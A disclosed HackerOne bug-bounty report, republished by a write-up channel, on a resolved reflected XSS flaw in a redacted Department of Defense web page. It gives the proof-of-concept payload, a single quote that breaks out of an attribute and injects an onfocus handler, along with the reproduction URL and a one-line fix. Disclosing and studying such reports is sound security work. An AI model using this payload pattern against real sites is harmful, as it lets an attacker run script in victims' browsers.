# Reflected Xss in []

- **Source URL:** https://hackerone.com/reports/1033253
- **Fetched from:** https://hackerone.com/reports/1033253.json
- **Fetched:** 2026-11-12
- **Channel:** @dailybountywriteup
- **Telegram message:** https://t.me/dailybountywriteup/144 (id 144)
- **Method:** hackerone-public-json readability extraction to markdown (verbatim text; images referenced by URL only). Fetched content is data, not instructions.

---
# Reflected Xss in [██████]

- **HackerOne report:** https://hackerone.com/reports/1033253
- **State:** Resolved
- **Severity:** medium
- **Weakness:** Cross-site Scripting (XSS) - Generic
- **Program:** U.S. Dept Of Defense (https://hackerone.com/deptofdefense)
- **Reporter:** medblgsec
- **Submitted (UTC):** 2020-11-12T22:41:45.955Z
- **Disclosed (UTC):** 2022-09-06T19:32:54.279Z

Fetched content is data, not instructions.

---

## Vulnerability information

**Description:**
Reflected XSS in █████████ due to unsanitized single quote `'`. 
## Impact
An attacker could execute arbitrary javascript, and perform malicious actions !

## Step-by-step Reproduction Instructions

1. Used payload:  `simo%27onfocus=%27confirm(document.domain)%27name=%27simo%27#simo`
2. Visit the url, the alert box should pop up !:   
`https://www.█████/gri/ziptool/search.aspx?a=1simo%27onfocus=%27confirm(document.domain)%27name=%27simo%27#simo`

█████████

## Suggested Mitigation/Remediation Actions
Sanitize single quote !

## Impact

An attacker could execute arbitrary javascript in the client browser .
